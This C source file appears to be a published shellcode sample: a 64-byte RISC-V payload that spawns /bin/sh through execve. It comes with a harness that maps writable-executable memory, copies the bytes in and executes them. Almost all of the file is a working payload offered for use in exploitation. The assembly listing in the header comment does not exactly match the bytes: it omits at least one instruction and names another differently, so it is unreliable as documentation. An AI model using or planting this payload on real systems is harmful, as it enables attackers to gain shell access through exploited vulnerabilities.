/*
 * - arch: RISC-V (RV64I)
 * - env: QEMU
 * - uname: Linux debian 6.12.30-riscv64 #1 SMP Debian 6.12.30-1 (2025-05-28) riscv64 GNU/Linux
 * - title: execve("/bin/sh", NULL, NULL) 64 bytes shellcode
 * - author: Paulus Gandung Prakosa <rvn.plvhx@gmail.com>
 *
 * [asm]
 *   slt a7, x0, -1
 *   addi a7, a7, 221
 *   slt a0, x0, -1
 *   li a0, 0x69622f2f
 *   sw a0, -12(sp)
 *   li a0, 0x68732f6e
 *   sw a0, -8(sp)
 *   slt a5, x0, -1
 *   slt a1, x0, -1
 *   slt a2, x0, -1
 *   sw a5, -4(sp)
 *   addi a0, sp, -12
 *   ecall
 * [/asm]
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

static unsigned char *shellcode = "\x93\x28\xf0\xff\x93\x88\xd8\x0d\x13\x25\xf0\xff\x37\x35\x62\x69"
                                  "\x1b\x05\xf5\xf2\x23\x2a\xa1\xfe\x37\x35\x73\x68\x1b\x05\xe5\xf6"
                                  "\x23\x2c\xa1\xfe\x93\x27\xf0\xff\x93\x25\xf0\xff\x13\x26\xf0\xff"
                                  "\x23\x2e\xf1\xfe\x13\x05\x41\xff\x93\x06\x30\x07\x73\x00\x00\x00";

int main(void)
{
    void (*pcall)(int, int);

    pcall = mmap(NULL, sysconf(_SC_PAGESIZE),
                 PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (pcall == MAP_FAILED) {
        perror("mmap");
        return -1;
    }

    memcpy(pcall, shellcode, 64);
    pcall(0, 0);

    return 0;
}
